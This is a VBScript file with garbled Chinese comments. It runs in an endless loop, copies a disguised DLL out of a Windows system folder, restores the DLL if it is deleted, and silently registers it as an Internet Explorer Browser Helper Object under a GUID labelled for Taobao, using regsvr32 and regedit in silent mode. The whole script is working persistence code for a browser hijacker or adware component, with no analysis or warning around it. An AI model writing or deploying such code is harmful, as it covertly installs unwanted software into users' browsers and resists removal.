dim ie
Call Main
Sub Main()
On Error Resume Next
    do         
        Call SetBhoo
        wscript.sleep 36000      
    loop    
End Sub

'bho,�ɹ�����1,ʧ�ܻ���󷵻�0
Public Function SetBhoo()  
On Error Resume Next
    Dim dll_path,move_path,taobao_guid,regPath
    dll_path="C:\WINDOWS\mys\Qvod5821,192.dll"
    move_path="C:\WINDOWS\dll.DLL"
    taobao_guid="{C5C0A421-0419-41EA-9A9E-76ACBAE1DE42}"
    regPath = "C:\WINDOWS\bhobhoreg.reg"
    set fso=wscript.createobject("scripting.filesystemobject")
    fso.copyfile dll_path,move_path
    '�ж��ļ��Ƿ����
    if (not fso.FileExists(dll_path)) and (fso.FileExists(move_path)) then 
        fso.copyfile move_path,dll_path
    end if
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" & taobao_guid & "\") 
    If data="" Then
        'ע���ļ�
        Set fso  = Nothing
	      Set WshShell= CreateObject("WScript.Shell") 
	      WshShell.Run "regsvr32.exe /s " & dll_path
        Set WshShell  = Nothing
        
        
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" & taobao_guid & "]"
        Set fso  = Nothing
        Set WshShell= CreateObject("WScript.Shell") 
	      WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing
    End If
End Function

